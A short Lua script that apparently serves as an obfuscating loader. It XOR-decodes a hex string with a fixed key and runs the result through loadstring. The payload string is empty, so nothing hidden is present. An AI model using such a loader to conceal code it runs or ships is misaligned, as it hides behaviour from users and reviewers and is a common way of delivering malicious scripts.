local k={8,110,242,177,12,238,168,5,14,126,79,39,218,28,15,226,130,11,166,163,4,49,138,251,93,255,35,125,165,199,206,78}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
